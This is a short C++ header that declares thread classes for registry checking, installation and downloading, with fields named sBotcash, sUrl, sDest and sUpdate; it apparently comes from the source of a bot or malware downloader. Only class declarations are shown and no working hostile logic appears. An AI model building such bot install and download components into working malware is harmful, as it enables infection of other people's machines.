// CDownload class
#include "Include.h"
#include "CThread.h"

class CRegCheck : public CThread {
public:
	virtual void *Run();
	void Uninstall();
};

class CInstall : public CThread {
public:
	virtual void *Run();
};

class CDownload : public CThread {
public:
	virtual void *Run();

    string sBotcash;
	string sUrl;
	string sDest;
	string sUpdate;
};